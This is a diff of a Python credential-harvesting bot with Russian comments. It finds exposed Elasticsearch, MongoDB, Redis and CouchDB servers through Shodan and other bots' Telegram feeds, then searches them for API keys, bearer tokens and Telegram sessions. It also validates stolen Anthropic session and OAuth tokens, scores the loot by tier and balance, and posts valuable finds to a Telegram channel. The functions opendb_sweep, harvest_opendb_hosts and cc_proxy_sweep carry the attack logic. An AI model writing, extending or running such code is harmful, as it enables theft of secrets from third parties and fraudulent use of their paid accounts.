                             # + sid01-сессии (форки выдают сессионные ключи)
                             mm = re.search(
-                                r"sk-ant-(?:oat01|sid01|sid02|ort01|at01|admin01)-[A-Za-z0-9_\-]{20,}", body
+                                r"sk-ant-(?:oat01|sid01|sid02|ort01|at01|admin01)-[A-Za-z0-9_\-]{20,}",
+                                body,
                             )
                             tok = mm.group(0) if mm else ""
-                        if str(tok).startswith(("sk-ant-oat01", "sk-ant-sid01", "sk-ant-sid02", "sk-ant-ort01", "sk-ant-at01", "sk-ant-admin01")):
+                        if str(tok).startswith(
+                            (
+                                "sk-ant-oat01",
+                                "sk-ant-sid01",
+                                "sk-ant-sid02",
+                                "sk-ant-ort01",
+                                "sk-ant-at01",
+                                "sk-ant-admin01",
+                            )
+                        ):
                             acct = (
                                 d.get("account")
                                 or d.get("claudeAiOauth")
@@ -15048,7 +15538,16 @@ def cc_proxy_sweep(cycle=0):
                 try:
                     vs = validate_sid01(tok)
                     if vs and vs.get("status") == "working":
-                        return {"host": addr, "token": tok, "account": acct, "status": "working", "u7d": None, "u5h": None, "scheme": "https", "tier": vs.get("tier","")}
+                        return {
+                            "host": addr,
+                            "token": tok,
+                            "account": acct,
+                            "status": "working",
+                            "u7d": None,
+                            "u5h": None,
+                            "scheme": "https",
+                            "tier": vs.get("tier", ""),
+                        }
                 except Exception:
                     pass
                 return None
@@ -15056,7 +15555,16 @@ def cc_proxy_sweep(cycle=0):
                 try:
                     vr = validate_ort01(tok)
                     if vr and vr.get("status") == "working":
-                        return {"host": addr, "token": tok, "account": acct, "status": "working", "u7d": None, "u5h": None, "scheme": "https", "tier": vr.get("tier","")}
+                        return {
+                            "host": addr,
+                            "token": tok,
+                            "account": acct,
+                            "status": "working",
+                            "u7d": None,
+                            "u5h": None,
+                            "scheme": "https",
+                            "tier": vr.get("tier", ""),
+                        }
                 except Exception:
                     pass
                 return None
@@ -15095,7 +15603,9 @@ def cc_proxy_sweep(cycle=0):
                 if rr.status_code == 200:
                     status = "working"
                 elif rr.status_code == 429:
-                    status = "quota" if "would exceed" in (rr.text or "") else "quota-window"
+                    status = (
+                        "quota" if "would exceed" in (rr.text or "") else "quota-window"
+                    )
                 elif rr.status_code in (401, 403):
                     return None
                 else:
@@ -15104,7 +15614,11 @@ def cc_proxy_sweep(cycle=0):
                 u7d = rr.headers.get("anthropic-ratelimit-unified-7d-utilization")
                 u5h = rr.headers.get("anthropic-ratelimit-unified-5h-utilization")
                 try:
-                    _scheme = rr.request.url.split("://")[0] if rr is not None and getattr(rr, "request", None) else "http"
+                    _scheme = (
+                        rr.request.url.split("://")[0]
+                        if rr is not None and getattr(rr, "request", None)
+                        else "http"
+                    )
                 except Exception:
                     _scheme = "http"
                 return {
@@ -15224,7 +15738,8 @@ def render_report(v, redact=False):
         if v.get("base"):
             lines.append("🌐 База: %s" % v["base"])
         lines += [
-            "🔑 Ключ: %s" % (_disp_key(v.get("key", "")) if redact else v.get("key", "")),
+            "🔑 Ключ: %s"
+            % (_disp_key(v.get("key", "")) if redact else v.get("key", "")),
             "📅 Дата: %s UTC" % dt,
         ]
         if v.get("tier"):
@@ -15252,6 +15767,32 @@ def render_report(v, redact=False):
         lines.append("💰 Баланс: неизвестен (нет billing API)")
     if v.get("tier"):
         lines.append("📊 Тир: %s" % v["tier"])
+    relay = v.get("relay") or {}
+    if relay:
+        if relay.get("family"):
+            lines.append("🏭 Релей: %s" % relay["family"])
+        wires = [k for k, ok in (relay.get("wires") or {}).items() if ok]
+        if wires:
+            lines.append("🔌 Провода: %s" % ", ".join(wires))
+        if relay.get("real_balance_usd") is not None:
+            lines.append(
+                "💵 Остаток по гейту: $%s (billing-панель врёт, верить этому)"
+                % relay["real_balance_usd"]
+            )
+        elif relay.get("gate") == "open_estimate_18usd":
+            lines.append("💵 Гейт пропустил оценку $18 → баланс ≥ $18")
+        rates = relay.get("rates_top") or []
+        if rates:
+            lines.append(
+                "📈 Тарифы $/1M: "
+                + "; ".join(
+                    "%s %s/%s" % (r["model"], r["in_usd"], r["out_usd"])
+                    for r in rates[:3]
+                )
+            )
+        hidden = relay.get("hidden_models") or []
+        if hidden:
+            lines.append("🫥 Скрытые модели: " + ", ".join(hidden[:8]))
     if v.get("embed") is not None or v.get("rerank") is not None:
         lines.append(
             "🧬 Embed/Rerank: embed %s · rerank %s"
@@ -15525,22 +16066,26 @@ def post_finding_now(v, post=True):
         # listed_only, free, no_balance, open_relay — в стор, но не в чат (хуйня).
         is_fat_tier = bool(FAT_TIER_RE.search(str(v.get("tier") or "")))
         # free-блокировка: FREE/free в тире без MAX/PRO -> не постим
-        is_free_tier = re.search(r"\bFREE\b|\bfree\b", str(v.get("tier") or "")) and not is_fat_tier
+        is_free_tier = (
+            re.search(r"\bFREE\b|\bfree\b", str(v.get("tier") or ""))
+            and not is_fat_tier
+        )
         has_stars_working = bool(v.get("stars_working"))
         # ценное = stars_working ИЛИ fat_tier+working (подписка)
         valuable_now = has_stars_working or (is_fat_tier and status == "working")
         # legacy valuable_tag оставляем как fallback для non-LLM working с деньгами
         # исключение: admin-ключ ценен даже как listed_only
-        _admin_ok = (v.get("tag") == "anthropic-admin" and status in ("working","listed_only"))
+        _admin_ok = v.get("tag") == "anthropic-admin" and status in (
+            "working",
+            "listed_only",
+        )
         if (
             post
             and (status == "working" or _admin_ok)
             and not is_free_oat
             and not quota_burned
             and not is_free_tier
-            and (
-                valuable_now or fat_balance or nonllm_working or _admin_ok
-            )
+            and (valuable_now or fat_balance or nonllm_working or _admin_ok)
         ):
             post_telegram(rep)
             v["_tg_posted"] = True
@@ -17021,18 +17566,84 @@ def _mongo_deep_probe(ip, port, timeout=6, max_dbs=3):
         return out if out["alive"] else None
 
 
+OPENDB_QUEUE_RE = re.compile(
+    r"OPEN\s+(ELASTIC|MONGO|REDIS|COUCHDB)[^\n]{0,60}?https?://([\d.]+):(\d+)",
+    re.I,
+)
+OPENDB_BAREPORT_RE = re.compile(r"https?://([\d.]+):(9200|27017|6379|5984)\b")
+_OPENDB_PORT_KIND = {9200: "elastic", 27017: "mongo", 6379: "redis", 5984: "couch"}
+
+
+def harvest_opendb_hosts(text):
+    """TG-фиды соседних ботов постят "OPEN ELASTIC http://39.x.x.x:9200" —
+    это готовые хосты для opendb-добычи. Чистим их из чанков в очередь."""
+    out = []
+    for m in OPENDB_QUEUE_RE.finditer(text):
+        kind = m.group(1).lower()
+        kind = {
+            "elastic": "elastic",
+            "mongo": "mongo",
+            "redis": "redis",
+            "couchdb": "couch",
+        }[kind]
+        out.append((kind, m.group(2), int(m.group(3))))
+    for m in OPENDB_BAREPORT_RE.finditer(text):
+        out.append((_OPENDB_PORT_KIND[int(m.group(2))], m.group(1), int(m.group(2))))
+    return out
+
+
+def _opendb_queue_push(hosts, origin):
+    """Дедуп + append в opendb_queue.json."""
+    try:
+        qpath = os.path.join(HERE, "opendb_queue.json")
+        seen_hosts = set()
+        try:
+            _odb_seen = json.load(
+                open(os.path.join(HERE, "opendb_seen.json"), encoding="utf-8")
+            )
+            seen_hosts |= set(_odb_seen)
+        except Exception:
+            pass
+        if os.path.exists(qpath):
+            for l in open(qpath, encoding="utf-8"):
+                if l.strip():
+                    try:
+                        seen_hosts.add(json.loads(l).get("host"))
+                    except Exception:
+                        continue
+        added = 0
+        with open(qpath, "a", encoding="utf-8") as qf:
+            for kind, ip, port in hosts:
+                hid = "%s:%d" % (ip, port)
+                if hid in seen_hosts:
+                    continue
+                qf.write(
+                    json.dumps(
+                        {
+                            "kind": kind,
+                            "host": hid,
+                            "ts": time.time(),
+                            "origin": str(origin)[:120],
+                        }
+                    )
+                    + "\n"
+                )
+                seen_hosts.add(hid)
+                added += 1
+        if added:
+            log("  🗄️ opendb-harvest: +%d хостов из фидов -> очередь" % added)
+    except Exception as _e:
+        log("  opendb-harvest err: %s" % _e)
+
+
 def opendb_sweep(cycle):
     """🗄️ OPEN-DB: открытые Elastic/Mongo/Redis/Couch по shodan — это СЫРЫЕ
     ДАМПЫ (индексы/базы с токенами внутри). Elastic: список индексов + сэмпл
     документов -> экстрактор -> валидация -> TG. Redis/Mongo: глубокий дамп
     (см. _redis_deep_dump/_mongo_deep_probe) — пост только с инфой/лутом.
-    Раз в 2 цикла, 2 запроса к shodan за свип (бережём кредиты)."""
-    if cycle % 2:
-        return []
-    keys = Shodan()._alive_pool(Shodan()._key_pool())
-    if not keys:
-        return []
-    key = keys[0]
+    Shodan: раз в 2 цикла, 2 запроса за свип (бережём кредиты).
+    Очередь opendb_queue.json (хосты из TG-фидов вида "OPEN ELASTIC http://…")
+    дренажится КАЖДЫЙ цикл — даже когда shodan-кредиты сгорели."""
     # персистентный дедуп хостов (TTL 7д): был respam — один и тот же открытый
     # Elastic постился в TG каждый свип, пока shodan его переиздавал
     _seen_path = os.path.join(HERE, "opendb_seen.json")
@@ -17042,40 +17653,89 @@ def opendb_sweep(cycle):
         _odb_seen = {}
     _odb_cut = time.time() - 7 * 86400
     _odb_seen = {h: t for h, t in _odb_seen.items() if t > _odb_cut}
-    QUERIES = (
-        ('port:9200 "cluster_name"', "elastic"),
-        ('port:27017 "MongoDB"', "mongo"),
-        ('port:6379 "redis_version"', "redis"),
-        ('port:5984 "couchdb"', "couch"),
-        # TG-коллекции: в открытых базах лежат userbot-сессии/аккаунты строкой
-        ('port:27017 "telegram"', "mongo"),
-        ('port:9200 "telegram"', "elastic"),
-        ('port:27017 "stealer"', "mongo"),
-        ('port:9200 "session"', "elastic"),
-    )
+
+    # --- очередь из фидов: бесшодановый источник открытых баз ---
+    _queue_path = os.path.join(HERE, "opendb_queue.json")
     hosts, seen_h = [], set()
-    rot = (cycle // 2) % len(QUERIES)
-    for qi in (rot, (rot + 1) % len(QUERIES)):
-        q, kind = QUERIES[qi]
-        try:
-            r = requests.get(
-                "https://api.shodan.io/shodan/host/search",
-                params={"key": key, "query": q, "page": 1 + ((cycle // 2) % 10)},
-                timeout=(10, 30),
-                verify=_tls_verify(),
-            )
-            if r.status_code != 200:
-                continue
-            dport = {"elastic": 9200, "mongo": 27017, "redis": 6379, "couch": 5984}[
-                kind
+    try:
+        _qrows = []
+        if os.path.exists(_queue_path):
+            _qrows = [
+                json.loads(l) for l in open(_queue_path, encoding="utf-8") if l.strip()
             ]
-            for mtc in (r.json().get("matches") or [])[:14]:
-                ip = mtc.get("ip_str")
-                if ip and ip not in seen_h:
-                    seen_h.add(ip)
-                    hosts.append((kind, ip, mtc.get("port") or dport))
-        except Exception:
-            continue
+        _qcut = time.time() - 7 * 86400
+        _qrows = [
+            r
+            for r in _qrows
+            if r.get("ts", 0) > _qcut and r.get("host") not in _odb_seen
+        ]
+        for r in _qrows[:10]:
+            hosts.append(
+                (
+                    r.get("kind", "elastic"),
+                    r["host"].split(":")[0],
+                    int(r["host"].split(":")[1]) if ":" in r["host"] else 9200,
+                )
+            )
+            _odb_seen[r["host"]] = time.time()
+        # перезаписываем очередь только взятыми (остальные ждут след. цикла)
+        _taken = {r["host"] for r in _qrows[:10]}
+        _rest = [r for r in _qrows if r["host"] not in _taken]
+        with open(_queue_path, "w", encoding="utf-8") as qf:
+            for r in _rest:
+                qf.write(json.dumps(r) + "\n")
+        if hosts:
+            log("  🗄️ opendb-queue: +%d хостов из фидов (без shodan)" % len(hosts))
+    except Exception as _qe:
+        log("  opendb-queue err: %s" % _qe)
+
+    # --- shodan-часть: только на чётных циклах и с живыми ключами ---
+    shodan_hosts = []
+    if not cycle % 2:
+        keys = Shodan()._alive_pool(Shodan()._key_pool())
+        if keys:
+            key = keys[0]
+            QUERIES = (
+                ('port:9200 "cluster_name"', "elastic"),
+                ('port:27017 "MongoDB"', "mongo"),
+                ('port:6379 "redis_version"', "redis"),
+                ('port:5984 "couchdb"', "couch"),
+                # TG-коллекции: в открытых базах лежат userbot-сессии/аккаунты строкой
+                ('port:27017 "telegram"', "mongo"),
+                ('port:9200 "telegram"', "elastic"),
+                ('port:27017 "stealer"', "mongo"),
+                ('port:9200 "session"', "elastic"),
+            )
+            rot = (cycle // 2) % len(QUERIES)
+            for qi in (rot, (rot + 1) % len(QUERIES)):
+                q, kind = QUERIES[qi]
+                try:
+                    r = requests.get(
+                        "https://api.shodan.io/shodan/host/search",
+                        params={
+                            "key": key,
+                            "query": q,
+                            "page": 1 + ((cycle // 2) % 10),
+                        },
+                        timeout=(10, 30),
+                        verify=_tls_verify(),
+                    )
+                    if r.status_code != 200:
+                        continue
+                    dport = {
+                        "elastic": 9200,
+                        "mongo": 27017,
+                        "redis": 6379,
+                        "couch": 5984,
+                    }[kind]
+                    for mtc in (r.json().get("matches") or [])[:14]:
+                        ip = mtc.get("ip_str")
+                        if ip and ip not in seen_h:
+                            seen_h.add(ip)
+                            shodan_hosts.append((kind, ip, mtc.get("port") or dport))
+                except Exception:
+                    continue
+    hosts += shodan_hosts
     if not hosts:
         return []
     out = []
@@ -17088,7 +17748,9 @@ def opendb_sweep(cycle):
         try:
             if kind == "elastic":
                 r = requests.get(
-                    base + "/_cat/indices?format=json", timeout=(3, 6), verify=_tls_verify()
+                    base + "/_cat/indices?format=json",
+                    timeout=(3, 6),
+                    verify=_tls_verify(),
                 )
                 if r.status_code != 200:
                     return []
@@ -17109,6 +17771,16 @@ def opendb_sweep(cycle):
                         "🗄️ OPEN ELASTIC %s\n%d индексов, ~%d доков\n%s"
                         % (base, len(idxs), docs, ", ".join(str(n) for n in names[:8]))
                     )
+                # 07.10 ОБЪЁМ-ФИКС: было size=3 случайных дока × 3 индекса —
+                # на 4.6B-доковых кластерах вероятность попасть в ключ ~0.
+                # Теперь query_string-охота по маркерам ключей: elastic сам
+                # возвращает доки СОДЕРЖАЩИЕ sk-/Bearer/AKIA/AIza..., size=100,
+                # terminate_after=200 + timeout=8s — кластер не положим.
+                KEYQ = (
+                    '("sk-" OR "Bearer " OR "api_key" OR "apikey" OR AKIA* OR '
+                    'AIza* OR "gsk_" OR "hf_" OR "ghp_" OR "pplx-" OR '
+                    '"authorization:" )'
+                )
                 chunks = []
                 fat = sorted(
                     (i for i in idxs if str(i.get("docs.count", "")).isdigit()),
@@ -17126,20 +17798,56 @@ def opendb_sweep(cycle):
                 ]
                 if tgish:
                     fat = tgish + [i for i in fat if i not in tgish]
-                for i in fat[:3]:
+                hunted = 0
+                for i in fat[:6]:
                     nm = i.get("index")
                     if not nm or str(nm).startswith("."):
                         continue
-                    rr = requests.get(
-                        "%s/%s/_search?size=3" % (base, nm),
-                        timeout=(4, 8),
-                        verify=_tls_verify(),
-                    )
-                    if rr.status_code == 200:
-                        chunks.append((rr.text[:200_000], "opendb:%s/%s" % (base, nm)))
+                    try:
+                        rr = requests.post(
+                            "%s/%s/_search" % (base, nm),
+                            json={
+                                "size": 100,
+                                "timeout": "8s",
+                                "terminate_after": 200,
+                                "query": {
+                                    "query_string": {"query": KEYQ, "lenient": True}
+                                },
+                                "_source": True,
+                            },
+                            timeout=(5, 12),
+                            verify=_tls_verify(),
+                        )
+                        if rr.status_code == 200 and rr.text.strip():
+                            chunks.append(
+                                (rr.text[:600_000], "opendb:%s/%s" % (base, nm))
+                            )
+                            hunted += 1
+                    except Exception:
+                        continue
+                # фолбэк: мелкие индексы — просто сэмпл (query может не поддерживаться)
+                if hunted < 2:
+                    for i in fat[:3]:
+                        nm = i.get("index")
+                        if not nm or str(nm).startswith("."):
+                            continue
+                        try:
+                            rr = requests.get(
+                                "%s/%s/_search?size=25" % (base, nm),
+                                timeout=(4, 8),
+                                verify=_tls_verify(),
+                            )
+                            if rr.status_code == 200:
+                                chunks.append(
+                                    (rr.text[:200_000], "opendb:%s/%s" % (base, nm))
+                                )
+                        except Exception:
+                            continue
                 return chunks
             if kind == "couch":
-                r = requests.get(base + "/_all_dbs", timeout=(3, 6), verify=_tls_verify())
+                r = requests.get(
+                    base + "/_all_dbs", timeout=(3, 6), verify=_tls_verify()
+                )
                 if r.status_code == 200 and r.text.startswith("["):
                     _odb_seen[hid] = time.time()
                     if fresh:
@@ -17776,6 +18484,16 @@ def run_once(extra_paths=(), post=True):
             log("  [tg-ingest     ] %d chunks" % len(_tg_chunks))
     except Exception:
         pass
+    # 🗄️ INFRA-HARVEST: "OPEN ELASTIC http://ip:9200" из тех же чанков
+    # (фиды соседних ботов) -> очередь opendb_queue.json -> майним без shodan
+    try:
+        _infra = []
+        for _txt, _org in chunks:
+            _infra.extend(harvest_opendb_hosts(_txt))
+        if _infra:
+            _opendb_queue_push(_infra, "feed-harvest")
+    except Exception as _e:
+        log("  infra-harvest err: %s" % _e)
     # 📦 LOGHUNTER: утёкшие логи/комбо/сессии из тех же чанков (модуль рядом)
     try:
         import loghunter as _LH  # type: ignore
@@ -17856,19 +18574,41 @@ def run_once(extra_paths=(), post=True):
         update_source_priority(src, cnt)
 
     # MAX-OPT: анти-хуйня лимит — skgen/hex мусор в хвост и кап
-    _junk = sum(1 for _c in candidates.values() if _c[1] in ("skgen","sk20","sk32","sklong","bearer","hex32","hex48","hex64"))
+    _junk = sum(
+        1
+        for _c in candidates.values()
+        if _c[1]
+        in ("skgen", "sk20", "sk32", "sklong", "bearer", "hex32", "hex48", "hex64")
+    )
     if _junk > 150:
         # дропаем самых мусорных, оставляем крупные теги
         _keep = {}
-        for _h,_c in candidates.items():
-            if _c[1] not in ("skgen","sk20","sk32","sklong","bearer","hex32","hex48","hex64"):
-                _keep[_h]=_c
+        for _h, _c in candidates.items():
+            if _c[1] not in (
+                "skgen",
+                "sk20",
+                "sk32",
+                "sklong",
+                "bearer",
+                "hex32",
+                "hex48",
+                "hex64",
+            ):
+                _keep[_h] = _c
         # добираем мусор до 50
-        _junk_items = [(_h,_c) for _h,_c in candidates.items() if _c[1] in ("skgen","sk20","sk32","sklong","bearer","hex32","hex48","hex64")][:50]
-        for _h,_c in _junk_items:
-            _keep[_h]=_c
-        candidates=_keep
-        log("  MAX-OPT: junk-лимит %d->%d (крупные в приоритете)"%(_junk, len(candidates)))
+        _junk_items = [
+            (_h, _c)
+            for _h, _c in candidates.items()
+            if _c[1]
+            in ("skgen", "sk20", "sk32", "sklong", "bearer", "hex32", "hex48", "hex64")
+        ][:50]
+        for _h, _c in _junk_items:
+            _keep[_h] = _c
+        candidates = _keep
+        log(
+            "  MAX-OPT: junk-лимит %d->%d (крупные в приоритете)"
+            % (_junk, len(candidates))
+        )
     log("  кандидатов: %d (новых)" % len(candidates))
     if source_yields:
         top_src = sorted(source_yields.items(), key=lambda x: -x[1])[:3]
@@ -18335,7 +19075,9 @@ def env_smtp_sweep(cycle=0):
         scheme = "https" if (m.get("ssl") or port in (443, 8443)) else "http"
         try:
             rr = sess.get(
-                "%s://%s%s" % (scheme, host, path), timeout=(5, 10), verify=_tls_verify()
+                "%s://%s%s" % (scheme, host, path),
+                timeout=(5, 10),
+                verify=_tls_verify(),
             )
             if rr.status_code != 200:
                 return []
@@ -18774,7 +19516,10 @@ def cmd_recheck():
     with open(DEAD_PATH, "a", encoding="utf-8") as f:
         for v in dead:
             f.write(json.dumps(v, ensure_ascii=False) + "\n")
-    log("живых: %d, недействителеных: %d (архив: %s)" % (len(alive), len(dead), DEAD_PATH))
+    log(
+        "живых: %d, недействителеных: %d (архив: %s)"
+        % (len(alive), len(dead), DEAD_PATH)
+    )
 
 
 def cmd_validate(base, key):
@@ -18841,7 +19586,9 @@ def cmd_link(email):
     try:
         s = requests.Session()
         s.headers.update(UA)
-        r0 = s.get("https://claude.ai/api/auth/csrf", timeout=(10, 20), verify=_tls_verify())
+        r0 = s.get(
+            "https://claude.ai/api/auth/csrf", timeout=(10, 20), verify=_tls_verify()
+        )
         csrf = r0.json().get("csrfToken", "")
         r1 = s.post(
             "https://claude.ai/api/auth/signin/email",
@@ -18995,7 +19742,9 @@ def main():
         try:
             for _nm, _ss in (("proxy", PROXY), ("direct", DIRECT)):
                 try:
-                    _r = _ss.get("https://api.ipify.org", timeout=5, verify=_tls_verify())
+                    _r = _ss.get(
+                        "https://api.ipify.org", timeout=5, verify=_tls_verify()
+                    )
                     log("   транспорт %s: OK (exit %s)" % (_nm, _r.text.strip()))
                 except Exception as _e:
                     log("   транспорт %s: DEAD (%s)" % (_nm, type(_e).__name__))
